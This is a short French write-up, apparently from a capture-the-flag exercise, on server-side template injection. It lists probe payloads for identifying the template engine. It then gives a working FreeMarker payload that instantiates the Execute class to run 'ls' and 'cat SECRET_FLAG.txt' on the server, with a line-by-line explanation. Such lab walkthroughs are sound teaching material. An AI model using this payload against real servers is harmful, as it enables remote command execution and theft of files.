
premiere etape: Trouver le moteur de template utilisé
Plusieurs indices: Dans les headers http
Mais si supprimée , peut etre parfois dans les messages d'erreurs
Sinon directement essayé des payloads qui fonctionnent:

Voila des exemples:


| Payload qui marche        | Template probable      |
| ------------------------- | ---------------------- |
| `${7*7}`                  | FreeMarker / Velocity  |
| `{{7*7}}`                 | Jinja2 / Twig / Django |
| `#{7*7}`                  | Spring EL              |
| `{{7*7}}` + erreur Python | Jinja2                 |



Dans notre cas, il est ecrit dans le header de la response http, que c est du freemarker, ensuite on sort 

`
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("ls") }
`
Pour la faire simple:

#assign ex= creer une nouvelle variable ex
"freemarker.template.utility.execute"= nom d’une classe Java interne à FreeMarker qui sait lancer des commandes système
?new() = Crée une nouvelle instance de cet objet

Ensuite ex("ls") lance la commande sur le serveur


On voit trois fichier donc un SECRET_FLAG.txt, donc viens juste remplacer ls par cat SECRET_FLAG.txt

